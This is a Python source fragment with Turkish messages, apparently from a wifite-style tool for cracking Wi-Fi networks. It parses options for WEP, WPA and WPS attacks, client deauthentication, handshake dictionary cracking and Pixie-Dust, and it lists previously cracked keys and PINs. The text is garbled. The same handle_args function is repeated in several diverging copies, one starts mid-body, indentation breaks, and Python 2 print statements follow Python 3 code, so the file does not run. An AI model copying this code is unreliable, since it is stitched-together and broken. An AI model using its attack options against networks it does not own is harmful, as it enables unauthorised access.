            print("\033[33m      Not: Bu seçenek sadece cihaz monitör modunda değilse çalışır!\033[0m")
            self.DO_NOT_CHANGE_MAC = False
        
        # Kablosuz arayüz seçeneği
        if options.interface:
            self.WIRELESS_IFACE = options.interface
            print(f"\033[32m [+] Kablosuz arayüz ayarlandı: \033[36m{self.WIRELESS_IFACE}\033[0m")
        
        # Monitör modunda olan arayüz seçeneği
        if options.monitor_interface:
            self.MONITOR_IFACE = options.monitor_interface
            print(f"\033[32m [+] Monitör modunda olan arayüz ayarlandı: \033[36m{self.MONITOR_IFACE}\033[0m")
        
        # Deauth işlemini kapatma seçeneği
        if options.nodeauth:
            self.SEND_DEAUTHS = False
            print("\033[32m [+] Tarama sırasında istemcileri deauthentice etmeyeceğiz.\033[0m")
        
        # ESSID seçeneği
        if options.essid:
            try:
                self.TARGET_ESSID = options.essid
            except ValueError:
                print("\033[31m [!] ESSID belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Hedef ESSID ayarlandı: \033[36m{self.TARGET_ESSID}\033[0m")
        
        # BSSID seçeneği
        if options.bssid:
            try:
                self.TARGET_BSSID = options.bssid
            except ValueError:
                print("\033[31m [!] BSSID belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Hedef BSSID ayarlandı: \033[36m{self.TARGET_BSSID}\033[0m")
        
        # MAC adresi gösterme seçeneği
        if options.showb:
            self.SHOW_MAC_IN_SCAN = True
            print("\033[32m [+] MAC adresi tarama sırasında \033[36maktif\033[0m")
        
        # Tüm erişim noktalarını hedefleme seçeneği
        if options.all:
            self.ATTACK_ALL_TARGETS = True
            print("\033[32m [+] Tüm erişim noktaları hedefleniyor.\033[0m")
        
        # Minimum güç seviyesi seçeneği
        if options.power:
            try:
                self.ATTACK_MIN_POWER = int(options.power)
            except ValueError:
                print(f"\033[31m [!] Geçersiz güç seviyesi: \033[31m{options.power}\033[0m")
            except IndexError:
                print("\033[31m [!] Güç seviyesi belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Minimum hedef gücü ayarlandı: \033[36m{self.ATTACK_MIN_POWER}\033[0m")
        
        # TX güç seviyesi seçeneği
        if options.tx:
            try:
                self.TX_POWER = int(options.tx)
            except ValueError:
                print(f"\033[31m [!] Geçersiz TX güç seviyesi: \033[31m{options.tx}\033[0m")
            except IndexError:
                print("\033[31m [!] TX güç seviyesi belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] TX güç seviyesi ayarlandı: \033[36m{self.TX_POWER}\033[0m")
        
        # Sessiz mod seçeneği
        if options.quiet:
            self.VERBOSE_APS = False
            print("\033[32m [+] AP listesinin tarama sırasında gösterilmesi \033[33mdevre dışı\033[0m")
        
        # Capture dosyasını kontrol etme seçeneği
        if options.check:
            try:
                capfile = options.check
            except IndexError:
                print("\033[31m [!] Capture dosyası analiz edilemedi. Dosya belirtilmedi!\033[0m")
                self.exit_gracefully(1)
            else:
                print(f"\033[32m [+] Capture dosyası: \033[36m{capfile}\033[0m")

    except Exception as e:
        print(f"\033[31m [!] Hata: Komut satırı argümanları işlenirken bir hata oluştu. Hata detayları: {e}\033[0m")
        print("\033[33m [*] Lütfen geçerli argümanları kullanıp kullanmadığınızı kontrol edin ve tekrar deneyin.\033[0m")
        self.exit_gracefully(1)

    # Kullanım talimatları ve ek bilgiler
    print("\033[34m [*] Kullanım talimatları:\033[0m")
    print("\033[34m [*] --wpa: WPA şifreli ağları hedef alır.\033[0m")
    print("\033[34m [*] --wep: WEP şifreli ağları hedef alır.\033[0m")
    print("\033[34m [*] --wps: WPS şifreleme ile korunan ağları hedef alır.\033[0m")
    print("\033[34m [*] --recrack: Daha önce kırılmış ağları da hedeflere dahil eder.\033[0m")
    print("\033[34m [*] --pixie: WPS Pixie-Dust saldırısını kullanır.\033[0m")
    print("\033[34m [*] --channel: Tarama sırasında kullanılacak kanalı belirtir.\033[0m")
    print("\033[34m [*] --mac_anon: MAC adresini anonimleştirir.\033[0m")
    print("\033[34m [*] --interface: Kullanılacak kablosuz arayüzü belirtir.\033[0m")
    print("\033[34m [*] --monitor_interface: Monitör modunda olan arayüzü belirtir.\033[0m")
    print("\033[34m [*] --nodeauth: Tarama sırasında istemcileri deauthentice etmeyi kapatır.\033[0m")
    print("\033[34m [*] --essid: Hedef ESSID'yi belirtir.\033[0m")
    print("\033[34m [*] --bssid: Hedef BSSID'yi belirtir.\033[0m")
    print("\033[34m [*] --showb: MAC adreslerinin tarama sırasında gösterilmesini sağlar.\033[0m")
    print("\033[34m [*] --all: Tüm erişim noktalarını hedefler.\033[0m")
    print("\033[34m [*] --power: Minimum hedef güç seviyesini belirtir.\033[0m")
    print("\033[34m [*] --tx: TX güç seviyesini belirtir.\033[0m")
    print("\033[34m [*] --quiet: AP listesinin tarama sırasında gösterilmesini kapatır.\033[0m")
    print("\033[34m [*] --check: Capture dosyasını analiz eder.\033[0m")

def handle_args(self):
    """
    Komut satırı argümanlarını işleyerek programın yapılandırmasını ayarlar.
    Kullanıcının belirttiği argümanlara göre çeşitli şifreleme ve tarama ayarlarını yapılandırır.
    """
    # Varsayılan ayarlar
    set_encrypt = False
    set_hscheck = False
    set_wep = False
    capfile = ''  # Analiz edilecek .cap dosyasının adı

    # Argümanları tanımla ve işle
    opt_parser = self.build_opt_parser()
    options = opt_parser.parse_args()

    try:
        # Şifreleme seçeneklerini kontrol et ve ayarla
        if not set_encrypt and (options.wpa or options.wep or options.wps):
            self.WPS_DISABLE = True
            self.WPA_DISABLE = True
            self.WEP_DISABLE = True
            set_encrypt = True
            print("\033[33m [!] Şifreleme seçenekleri devre dışı bırakıldı. Lütfen geçerli şifreleme türünü belirtin.\033[0m")
        
        # Daha önce kırılmış ağları göstermek için seçenek
        if options.recrack:
            self.SHOW_ALREADY_CRACKED = True
            print("\033[32m [+] Daha önce kırılmış ağlar da hedeflere dahil edilecek.\033[0m")
        
        # WPA şifrelemesi seçeneği
        if options.wpa:
            if options.wps:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor ve WPS taraması yapılacak.\033[0m")
            else:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor. WPS taraması yapmak için \033[36m--wps\033[0m seçeneğini kullanabilirsiniz.\033[0m")
            self.WPA_DISABLE = False
        
        # WEP şifrelemesi seçeneği
        if options.wep:
            print("\033[32m [+] WEP şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WEP_DISABLE = False
        
        # WPS şifrelemesi seçeneği
        if options.wps:
            print("\033[32m [+] WPS (Wi-Fi Protected Setup) şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WPS_DISABLE = False
        
        # Pixie-Dust saldırısı seçeneği
        if options.pixie:
            print("\033[32m [+] WPS-enabled ağlar hedefleniyor ve sadece WPS Pixie-Dust saldırısı kullanılacak.\033[0m")
            self.WPS_DISABLE = False
            self.WEP_DISABLE = True
            self.PIXIE = True
        
        # Kanal seçeneği
        if options.channel:
            try:
                self.TARGET_CHANNEL = int(options.channel)
            except ValueError:
                print(f"\033[33m [!] Geçersiz kanal: \033[31m{options.channel}\033[0m")
            except IndexError:
                print("\033[33m [!] Kanal belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Kanal ayarlandı: \033[36m{self.TARGET_CHANNEL}\033[0m")
        
        # MAC adresini anonimleştirme seçeneği
        if options.mac_anon:
            print("\033[32m [+] MAC adresi anonimleştirme \033[36maktif\033[0m")
            print("\033[33m      Not: Bu seçenek sadece cihaz monitör modunda değilse çalışır!\033[0m")
            self.DO_NOT_CHANGE_MAC = False
        
        # Kablosuz arayüz seçeneği
        if options.interface:
            self.WIRELESS_IFACE = options.interface
            print(f"\033[32m [+] Kablosuz arayüz ayarlandı: \033[36m{self.WIRELESS_IFACE}\033[0m")
        
        # Monitör modunda olan arayüz seçeneği
        if options.monitor_interface:
            self.MONITOR_IFACE = options.monitor_interface
            print(f"\033[32m [+] Monitör modunda olan arayüz ayarlandı: \033[36m{self.MONITOR_IFACE}\033[0m")
        
        # Deauth işlemini kapatma seçeneği
        if options.nodeauth:
            self.SEND_DEAUTHS = False
            print("\033[32m [+] Tarama sırasında istemcileri deauthentice etmeyeceğiz.\033[0m")
        
        # ESSID seçeneği
        if options.essid:
            try:
                self.TARGET_ESSID = options.essid
            except ValueError:
                print("\033[31m [!] ESSID belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Hedef ESSID ayarlandı: \033[36m{self.TARGET_ESSID}\033[0m")
        
        # BSSID seçeneği
        if options.bssid:
            try:
                self.TARGET_BSSID = options.bssid
            except ValueError:
                print("\033[31m [!] BSSID belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Hedef BSSID ayarlandı: \033[36m{self.TARGET_BSSID}\033[0m")
        
        # MAC adresi gösterme seçeneği
        if options.showb:
            self.SHOW_MAC_IN_SCAN = True
            print("\033[32m [+] MAC adresi tarama sırasında \033[36maktif\033[0m")
        
        # Tüm erişim noktalarını hedefleme seçeneği
        if options.all:
            self.ATTACK_ALL_TARGETS = True
            print("\033[32m [+] Tüm erişim noktaları hedefleniyor.\033[0m")
        
        # Minimum güç seviyesi seçeneği
        if options.power:
            try:
                self.ATTACK_MIN_POWER = int(options.power)
            except ValueError:
                print(f"\033[31m [!] Geçersiz güç seviyesi: \033[31m{options.power}\033[0m")
            except IndexError:
                print("\033[31m [!] Güç seviyesi belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Minimum hedef gücü ayarlandı: \033[36m{self.ATTACK_MIN_POWER}\033[0m")
        
        # TX güç seviyesi seçeneği
        if options.tx:
            try:
                self.TX_POWER = int(options.tx)
            except ValueError:
                print(f"\033[31m [!] Geçersiz TX güç seviyesi: \033[31m{options.tx}\033[0m")
            except IndexError:
                print("\033[31m [!] TX güç seviyesi belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] TX güç seviyesi ayarlandı: \033[36m{self.TX_POWER}\033[0m")
        
        # Sessiz mod seçeneği
        if options.quiet:
            self.VERBOSE_APS = False
            print("\033[32m [+] AP listesinin tarama sırasında gösterilmesi \033[33mdevre dışı\033[0m")
        
        # Capture dosyasını kontrol etme seçeneği
        if options.check:
            capfile = options.check
            if not os.path.exists(capfile):
                print("\033[31m [!] Capture dosyası analiz edilemedi!\033[0m")
                print(f"\033[31m [!] Dosya bulunamadı: \033[31m{capfile}\033[0m")
                self.exit_gracefully(1)
        
        # Kırılmış ağları gösterme seçeneği
        if options.cracked:
            if len(self.CRACKED_TARGETS) == 0:
                print("\033[31m [!] Kırılmış erişim noktası bulunamadı.\033[0m")
                print("\033[31m [!] Kırılmış erişim noktaları \033[31mcracked.db\033[0m dosyasında bulunamadı.\033[0m")
                self.exit_gracefully(1)
            print("\033[32m [+] Önceden kırılmış erişim noktaları:\033[0m")
            for victim in self.CRACKED_TARGETS:
                if victim.wps:
                    print(f'     \033[36m{victim.ssid}\033[0m (\033[36m{victim.bssid}\033[0m) : "\033[32m{victim.key}\033[0m" - Pin: \033[32m{victim.wps}\033[0m')
                else:
                    print(f'     \033[36m{victim.ssid}\033[0m (\033[36m{victim.bssid}\033[0m) : "\033[32m{victim.key}\033[0m"')
            print('')
            self.exit_gracefully(0)
        
        # WPA handshakes ayarları
        if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):
            self.WPA_HANDSHAKE_TSHARK = False
            self.WPA_HANDSHAKE_PYRIT = False
            self.WPA_HANDSHAKE_COWPATTY = False
            self.WPA_HANDSHAKE_AIRCRACK = False
            set_hscheck = True
        
        # Handshake stripping seçeneği
        if options.strip:
            self.WPA_STRIP_HANDSHAKE = True
            print("\033[35m [+] El sıkışma sıyırma \033[36maktif\033[0m")
        
        # WPA deauth timeout ayarları
        if options.wpadt:
            try:
                self.WPA_DEAUTH_TIMEOUT = int(options.wpadt)
            except ValueError:
                print(f"\033[31m [!] Geçersiz deauth timeout: \033[31m{options.wpadt}\033[0m")
            except IndexError:
                print("\033[31m [!] Deauth timeout belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] WPA deauth timeout ayarlandı: \033[36m{self.WPA_DEAUTH_TIMEOUT}\033[0m")
        
        # WPA attack timeout ayarları
        if options.wpat:
            try:
                self.WPA_ATTACK_TIMEOUT = int(options.wpat)
            except ValueError:
                print(f"\033[31m [!] Geçersiz attack timeout: \033[31m{options.wpat}\033[0m")
            except IndexError:
                print("\033[31m [!] Attack timeout belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] WPA attack timeout ayarlandı: \033[36m{self.WPA_ATTACK_TIMEOUT}\033[0m")
        
        # WPA cracking ayarları
        if options.crack:
            self.WPA_DONT_CRACK = False
            print("\033[32m [+] WPA cracking \033[36maktif\033[0m")
            if options.dic:
                try:
                    # Burada dictionary dosyasının yolu işlenir
                    dictionary_file = options.dic
                    # Daha fazla işleme yapılabilir
                except ValueError:
                    print(f"\033[31m [!] Geçersiz dictionary dosyası: \033[31m{options.dic}\033[0m")
                except IndexError:
                    print("\033[31m [!] Dictionary dosyası belirtilmedi!\033[0m")
                else:
                    print(f"\033[32m [+] Dictionary dosyası ayarlandı: \033[36m{dictionary_file}\033[0m")
    except Exception as e:
        print(f"\033[31m [!] Beklenmeyen bir hata oluştu: {str(e)}\033[0m")
        self.exit_gracefully(1)
def handle_args(self):
    """
    Komut satırı argümanlarını işleyerek programın yapılandırmasını ayarlar.
    Kullanıcının belirttiği argümanlara göre çeşitli şifreleme ve tarama ayarlarını yapılandırır.
    """
    set_encrypt = False
    set_hscheck = False
    set_wep = False
    capfile = ''  # Analiz edilecek .cap dosyasının adı

    opt_parser = self.build_opt_parser()
    options = opt_parser.parse_args()

    try:
        # Şifreleme seçeneklerini kontrol et ve ayarla
        if not set_encrypt and (options.wpa or options.wep or options.wps):
            self.WPS_DISABLE = True
            self.WPA_DISABLE = True
            self.WEP_DISABLE = True
            set_encrypt = True
            print("\033[33m [!] Şifreleme seçenekleri devre dışı bırakıldı. Lütfen geçerli şifreleme türünü belirtin.\033[0m")
        
        # WPA seçeneklerini kontrol et
        if options.wpa:
            self.WPA_DISABLE = False
            if options.wps:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor ve WPS taraması yapılacak.\033[0m")
            else:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor. WPS taraması yapmak için \033[36m--wps\033[0m seçeneğini kullanabilirsiniz.\033[0m")

        # WEP seçeneklerini kontrol et
        if options.wep:
            print("\033[32m [+] WEP şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WEP_DISABLE = False
        
        # WPS seçeneklerini kontrol et
        if options.wps:
            print("\033[32m [+] WPS (Wi-Fi Protected Setup) şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WPS_DISABLE = False
        
        # Pixie-Dust saldırısı seçeneği
        if options.pixie:
            print("\033[32m [+] WPS-enabled ağlar hedefleniyor ve sadece WPS Pixie-Dust saldırısı kullanılacak.\033[0m")
            self.WPS_DISABLE = False
            self.WEP_DISABLE = True
            self.PIXIE = True
        
        # Kanal seçeneği
        if options.channel:
            try:
                self.TARGET_CHANNEL = int(options.channel)
                print(f"\033[32m [+] Kanal ayarlandı: \033[36m{self.TARGET_CHANNEL}\033[0m")
            except ValueError:
                print(f"\033[33m [!] Geçersiz kanal: \033[31m{options.channel}\033[0m")
            except IndexError:
                print("\033[33m [!] Kanal belirtilmedi!\033[0m")
        
        # MAC adresini anonimleştirme seçeneği
        if options.mac_anon:
            print("\033[32m [+] MAC adresi anonimleştirme \033[36maktif\033[0m")
            print("\033[33m      Not: Bu seçenek sadece cihaz monitör modunda değilse çalışır!\033[0m")
            self.DO_NOT_CHANGE_MAC = False
        
        # Kablosuz arayüz seçeneği
        if options.interface:
            self.WIRELESS_IFACE = options.interface
            print(f"\033[32m [+] Kablosuz arayüz ayarlandı: \033[36m{self.WIRELESS_IFACE}\033[0m")
        
        # Monitör modunda olan arayüz seçeneği
        if options.monitor_interface:
            self.MONITOR_IFACE = options.monitor_interface
            print(f"\033[32m [+] Monitör modunda olan arayüz ayarlandı: \033[36m{self.MONITOR_IFACE}\033[0m")
        
        # Deauth işlemini kapatma seçeneği
        if options.nodeauth:
            self.SEND_DEAUTHS = False
            print("\033[32m [+] Tarama sırasında istemcileri deauthentice etmeyeceğiz.\033[0m")
        
        # ESSID seçeneği
        if options.essid:
            try:
                self.TARGET_ESSID = options.essid
                print(f"\033[32m [+] Hedef ESSID ayarlandı: \033[36m{self.TARGET_ESSID}\033[0m")
            except ValueError:
                print("\033[31m [!] ESSID belirtilmedi!\033[0m")
        
        # BSSID seçeneği
        if options.bssid:
            try:
                self.TARGET_BSSID = options.bssid
                print(f"\033[32m [+] Hedef BSSID ayarlandı: \033[36m{self.TARGET_BSSID}\033[0m")
            except ValueError:
                print("\033[31m [!] BSSID belirtilmedi!\033[0m")
        
        # MAC adresi gösterme seçeneği
        if options.showb:
            self.SHOW_MAC_IN_SCAN = True
            print("\033[32m [+] MAC adresi tarama sırasında \033[36maktif\033[0m")
        
        # Tüm erişim noktalarını hedefleme seçeneği
        if options.all:
            self.ATTACK_ALL_TARGETS = True
            print("\033[32m [+] Tüm erişim noktaları hedefleniyor.\033[0m")
        
        # Minimum güç seviyesi seçeneği
        if options.power:
            try:
                self.ATTACK_MIN_POWER = int(options.power)
                print(f"\033[32m [+] Minimum hedef gücü ayarlandı: \033[36m{self.ATTACK_MIN_POWER}\033[0m")
            except ValueError:
                print(f"\033[31m [!] Geçersiz güç seviyesi: \033[31m{options.power}\033[0m")
            except IndexError:
                print("\033[31m [!] Güç seviyesi belirtilmedi!\033[0m")
        
        # TX güç seviyesi seçeneği
        if options.tx:
            try:
                self.TX_POWER = int(options.tx)
                print(f"\033[32m [+] TX güç seviyesi ayarlandı: \033[36m{self.TX_POWER}\033[0m")
            except ValueError:
                print(f"\033[31m [!] Geçersiz TX güç seviyesi: \033[31m{options.tx}\033[0m")
            except IndexError:
                print("\033[31m [!] TX güç seviyesi belirtilmedi!\033[0m")
        
        # Sessiz mod seçeneği
        if options.quiet:
            self.VERBOSE_APS = False
            print("\033[32m [+] AP listesinin tarama sırasında gösterilmesi \033[33mdevre dışı\033[0m")
        
        # Capture dosyasını kontrol etme seçeneği
        if options.check:
            capfile = options.check
            if not os.path.exists(capfile):
                print("\033[31m [!] Capture dosyası analiz edilemedi!\033[0m")
                print(f"\033[31m [!] Dosya bulunamadı: \033[31m{capfile}\033[0m")
                self.exit_gracefully(1)
        
        # Kırılmış ağları gösterme seçeneği
        if options.cracked:
            if not self.CRACKED_TARGETS:
                print("\033[31m [!] Kırılmış erişim noktası bulunamadı.\033[0m")
                print("\033[31m [!] Kırılmış erişim noktaları \033[31mcracked.db\033[0m dosyasında bulunamadı.\033[0m")
                self.exit_gracefully(1)
            print("\033[32m [+] Önceden kırılmış erişim noktaları:\033[0m")
            for victim in self.CRACKED_TARGETS:
                if victim.wps:
                    print(f'     \033[36m{victim.ssid}\033[0m (\033[36m{victim.bssid}\033[0m) : "\033[32m{victim.key}\033[0m" - Pin: \033[32m{victim.wps}\033[0m')
                else:
                    print(f'     \033[36m{victim.ssid}\033[0m (\033[36m{victim.bssid}\033[0m) : "\033[32m{victim.key}\033[0m"')
            print('')
            self.exit_gracefully(0)
        
        # WPA handshakes ayarları
        if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):
            self.WPA_HANDSHAKE_TSHARK = False
            self.WPA_HANDSHAKE_PYRIT = False
            self.WPA_HANDSHAKE_COWPATTY = False
            self.WPA_HANDSHAKE_AIRCRACK = False
            set_hscheck = True
        
        if options.strip:
            self.WPA_STRIP_HANDSHAKE = True
            print("\033[32m [+] Handshake stripping \033[36maktif\033[0m")
        
        # WPA deauth timeout ayarları
        if options.wpadt:
            try:
                self.WPA_DEAUTH_TIMEOUT = int(options.wpadt)
                print(f"\033[32m [+] WPA deauth timeout ayarlandı: \033[36m{self.WPA_DEAUTH_TIMEOUT}\033[0m")
            except ValueError:
                print(f"\033[31m [!] Geçersiz deauth timeout: \033[31m{options.wpadt}\033[0m")
            except IndexError:
                print("\033[31m [!] Deauth timeout belirtilmedi!\033[0m")
        
        # WPA attack timeout ayarları
        if options.wpat:
            try:
                self.WPA_ATTACK_TIMEOUT = int(options.wpat)
                print(f"\033[32m [+] WPA attack timeout ayarlandı: \033[36m{self.WPA_ATTACK_TIMEOUT}\033[0m")
            except ValueError:
                print(f"\033[31m [!] Geçersiz attack timeout: \033[31m{options.wpat}\033[0m")
            except IndexError:
                print("\033[31m [!] Attack timeout belirtilmedi!\033[0m")
        
        # WPA cracking ayarları
        if options.crack:
            self.WPA_DONT_CRACK = False
            print("\033[32m [+] WPA cracking \033[36maktif\033[0m")
            if options.dic:
                try:
                    self.WPA_DICTIONARY = options.dic
                    if os.path.exists(options.dic):
                        print(f"\033[32m [+] WPA sözlüğü ayarlandı: \033[36m{self.WPA_DICTIONARY}\033[0m")
                    else:
                        print(f"\033[31m [!] WPA sözlüğü dosyası bulunamadı: \033[31m{options.dic}\033[0m")
                except ValueError:
                    print("\033[31m [!] WPA sözlüğü dosyası geçersiz.\033[0m")
                except IndexError:
                    print("\033[31m [!] WPA sözlüğü dosyası belirtilmedi!\033[0m")
                    self.exit_gracefully(1)
        
        # Handshake doğrulama araçları
        if options.tshark:
            self.WPA_HANDSHAKE_TSHARK = True
            print("\033[32m [+] TShark handshake doğrulaması \033[36maktif\033[0m")
        if options.pyrit:
            self.WPA_HANDSHAKE_PYRIT = True
            print("\033[32m [+] Pyrit handshake doğrulaması \033[36maktif\033[0m")
        if options.aircrack:
            self.WPA_HANDSHAKE_AIRCRACK = True
            print("\033[32m [+] Aircrack handshake doğrulaması \033[36maktif\033[0m")
        if options.cowpatty:
            self.WPA_HANDSHAKE_COWPATTY = True
            print("\033[32m [+] Cowpatty handshake doğrulaması \033[36maktif\033[0m")
        
        # WEP saldırı seçenekleri
        if not set_wep and (options.chopchop or options.fragment or options.caffeelatte or options.arpreplay \
                or options.p0841 or options.hirte):
            self.WEP_CHOPCHOP = False
            self.WEP_ARPREPLAY = False
            self.WEP_CAFFELATTE = False
            self.WEP_FRAGMENT = False
            self.WEP_P0841 = False
            self.WEP_HIRTE = False
        
        if options.chopchop:
            print("\033[32m [+] WEP chop-chop saldırısı \033[36maktif\033[0m")
            self.WEP_CHOPCHOP = True
        if options.fragment:
            print("\033[32m [+] WEP fragmentation saldırısı \033[36maktif\033[0m")
            self.WEP_FRAGMENT = True
        if options.caffeelatte:
            print("\033[32m [+] WEP caffe-latte saldırısı \033[36maktif\033[0m")
            self.WEP_CAFFELATTE = True
        if options.arpreplay:
            print("\033[32m [+] WEP arp-replay saldırısı \033[36maktif\033[0m")
            self.WEP_ARPREPLAY = True
        if options.p0841:
            print("\033[32m [+] WEP p0841 saldırısı \033[36maktif\033[0m")
            self.WEP_P0841 = True
        if options.hirte:
            print("\033[32m [+] WEP hirte saldırısı \033[36maktif\033[0m")
            self.WEP_HIRTE = True
        
        # Fake-authentication hata ayıklama seçeneği
        if options.fakeauth:
            print("\033[32m [+] Başarısız fake-authentication \033[31mignore edilecek\033[0m")
            self.WEP_IGNORE_FAKEAUTH = False
        
        # WEP CA ayarları
        if options.wepca:
            # WEP CA ile ilgili işlemler burada yapılır
            pass

    except Exception as e:
        print(f"\033[31m [!] Beklenmeyen bir hata oluştu: {str(e)}\033[0m")
        self.exit_gracefully(1)

try:
               def handle_args(self):
    """
    Komut satırı argümanlarını işleyerek programın yapılandırmasını ayarlar.
    Kullanıcının belirttiği argümanlara göre çeşitli şifreleme ve tarama ayarlarını yapılandırır.
    """
    try:
        # WEP IV ayarları
        if options.wepca:
            try:
                self.WEP_CRACK_AT_IVS = int(options.wepca)
                print(f"\033[32m [+] WEP cracking, IV sayısı \033[36m{self.WEP_CRACK_AT_IVS}\033[32m'yi geçtiğinde başlayacak\033[0m")
            except ValueError:
                print(f"\033[31m [!] Geçersiz IV sayısı: \033[31m{options.wepca}\033[0m")
            except IndexError:
                print("\033[31m [!] IV sayısı belirtilmedi!\033[0m")

        # WEP zaman aşımı ayarları
        if options.wept:
            try:
                self.WEP_TIMEOUT = int(options.wept)
                print(f"\033[32m [+] WEP saldırı zaman aşımı \033[36m{self.WEP_TIMEOUT} saniye\033[0m olarak ayarlandı")
            except ValueError:
                print(f"\033[31m [!] Geçersiz zaman aşımı: \033[31m{options.wept}\033[0m")
            except IndexError:
                print("\033[31m [!] Zaman aşımı belirtilmedi!\033[0m")

        # PPS (Packets Per Second) ayarları
        if options.pps:
            try:
                self.WEP_PPS = int(options.pps)
                print(f"\033[32m [+] Paket başına saniye (PPS) oranı \033[36m{self.WEP_PPS} paket/saniye\033[0m olarak ayarlandı")
            except ValueError:
                print(f"\033[31m [!] Geçersiz değer: \033[31m{options.pps}\033[0m")
            except IndexError:
                print("\033[31m [!] Değer belirtilmedi!\033[0m")

        # WEP CAP dosyasını kaydetme
        if options.wepsave:
            self.WEP_SAVE = True
            print("\033[32m [+] WEP .cap dosyası kaydetme \033[36maktif\033[0m")

        # WPS Zaman aşımı ayarları
        if options.wpst:
            try:
                self.WPS_TIMEOUT = int(options.wpst)
                print(f"\033[32m [+] WPS saldırı zaman aşımı \033[36m{self.WPS_TIMEOUT} saniye\033[0m olarak ayarlandı")
            except ValueError:
                print(f"\033[31m [!] Geçersiz zaman aşımı: \033[31m{options.wpst}\033[0m")
            except IndexError:
                print("\033[31m [!] Zaman aşımı belirtilmedi!\033[0m")

        # WPS oranı eşiği ayarları
        if options.wpsratio:
            try:
                self.WPS_RATIO_THRESHOLD = float(options.wpsratio)
                print(f"\033[32m [+] WPS deneme/çaba oranı eşiği \033[36m{self.WPS_RATIO_THRESHOLD}\033[0m olarak ayarlandı")
            except ValueError:
                print(f"\033[31m [!] Geçersiz oran: \033[31m{options.wpsratio}\033[0m")
            except IndexError:
                print("\033[31m [!] Oran belirtilmedi!\033[0m")

        # WPS maksimum tekrar ayarları
        if options.wpsretry:
            try:
                self.WPS_MAX_RETRIES = int(options.wpsretry)
                print(f"\033[32m [+] WPS maksimum tekrar sayısı \033[36m{self.WPS_MAX_RETRIES}\033[0m olarak ayarlandı")
            except ValueError:
                print(f"\033[31m [!] Geçersiz sayı: \033[31m{options.wpsretry}\033[0m")
            except IndexError:
                print("\033[31m [!] Tekrar sayısı belirtilmedi!\033[0m")

        # WPA ilgili ayarlar
        if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):
            self.WPA_HANDSHAKE_TSHARK = self.WPA_HANDSHAKE_PYRIT = self.WPA_HANDSHAKE_COWPATTY = self.WPA_HANDSHAKE_AIRCRACK = False
            set_hscheck = True

        # WPA handshake doğrulama araçları
        if options.tshark:
            self.WPA_HANDSHAKE_TSHARK = True
            print("\033[32m [+] Tshark ile WPA handshake doğrulama \033[36maktif\033[0m")
        if options.pyrit:
            self.WPA_HANDSHAKE_PYRIT = True
            print("\033[32m [+] Pyrit ile WPA handshake doğrulama \033[36maktif\033[0m")
        if options.aircrack:
            self.WPA_HANDSHAKE_AIRCRACK = True
            print("\033[32m [+] Aircrack ile WPA handshake doğrulama \033[36maktif\033[0m")
        if options.cowpatty:
            self.WPA_HANDSHAKE_COWPATTY = True
            print("\033[32m [+] Cowpatty ile WPA handshake doğrulama \033[36maktif\033[0m")

        # WPA cracking
        if options.crack:
            self.WPA_DONT_CRACK = False
            print("\033[32m [+] WPA cracking \033[36maktif\033[0m")
            if options.dic:
                try:
                    self.WPA_DICTIONARY = options.dic
                    if os.path.exists(self.WPA_DICTIONARY):
                        print(f"\033[32m [+] WPA sözlüğü \033[36m{self.WPA_DICTIONARY}\033[0m olarak ayarlandı")
                    else:
                        print(f"\033[31m [!] WPA sözlüğü dosyası bulunamadı: \033[31m{self.WPA_DICTIONARY}\033[0m")
                except IndexError:
                    print("\033[31m [!] WPA sözlüğü dosyası belirtilmedi!\033[0m")
                    self.exit_gracefully(1)
            else:
                print("\033[31m [!] WPA sözlüğü dosyası belirtilmedi!\033[0m")
                self.exit_gracefully(1)

        # WEP saldırı türleri
        if not set_wep and any([options.chopchop, options.fragment, options.caffeelatte, options.arpreplay, options.p0841, options.hirte]):
            self.WEP_CHOPCHOP = self.WEP_ARPREPLAY = self.WEP_CAFFELATTE = self.WEP_FRAGMENT = self.WEP_P0841 = self.WEP_HIRTE = False

        if options.chopchop:
            self.WEP_CHOPCHOP = True
            print("\033[32m [+] WEP chop-chop saldırısı \033[36maktif\033[0m")
        if options.fragment:
            self.WEP_FRAGMENT = True
            print("\033[32m [+] WEP fragmentasyon saldırısı \033[36maktif\033[0m")
        if options.caffeelatte:
            self.WEP_CAFFELATTE = True
            print("\033[32m [+] WEP caffe-latte saldırısı \033[36maktif\033[0m")
        if options.arpreplay:
            self.WEP_ARPREPLAY = True
            print("\033[32m [+] WEP arp-replay saldırısı \033[36maktif\033[0m")
        if options.p0841:
            self.WEP_P0841 = True
            print("\033[32m [+] WEP p0841 saldırısı \033[36maktif\033[0m")
        if options.hirte:
            self.WEP_HIRTE = True
            print("\033[32m [+] WEP hirte saldırısı \033[36maktif\033[0m")

        # WEP sahte kimlik doğrulama
        if options.fakeauth:
            self.WEP_IGNORE_FAKEAUTH = False
            print("\033[32m [+] Sahte kimlik doğrulama hatalarını \033[31mönemsiz\033[0m olarak ayarla")

    except Exception as e:
        print(f"\033[31m [!] Beklenmeyen bir hata oluştu: {str(e)}\033[0m")
        self.exit_gracefully(1)

        except IndexError:
        print '\nindexerror\n\n'

        if capfile != '':
            self.RUN_ENGINE.analyze_capfile(capfile)
        print ''

    def build_opt_parser(self):
        """ Options are doubled for backwards compatability; will be removed soon and
            fully moved to GNU-style
